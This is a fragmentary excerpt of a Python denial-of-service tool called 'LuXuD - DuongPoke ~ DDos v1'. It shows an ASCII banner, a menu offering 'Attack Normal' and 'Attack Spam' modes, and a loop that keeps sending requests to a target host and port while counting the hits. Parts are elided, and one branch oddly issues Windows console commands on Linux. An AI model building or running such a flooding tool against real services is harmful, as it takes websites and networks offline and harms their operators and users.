...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title LuXuD - DuongPoke ~ DDos v1")
    print('''
        ██╗     ██╗   ██╗██╗  ██╗██╗   ██╗██████╗ 
        ██║     ██║   ██║╚██╗██╔╝██║   ██║██╔══██╗
        ██║     ██║   ██║ ╚███╔╝ ██║   ██║██║  ██║
...
def choice_method_attack():
    ...
    print("══════════════════════════════════════════════╗")
    print("Method: ══════════════════════════════════════╝")
    print("|_--> 1: Attack Normal")
    print("|_--> 2: Attack Spam")
    method_attack = input("[*] Method Attack [1/2]: ")
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] ATTACKING...")
                req_code += 1
                sys.stdout.write("[!] Attacking... [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
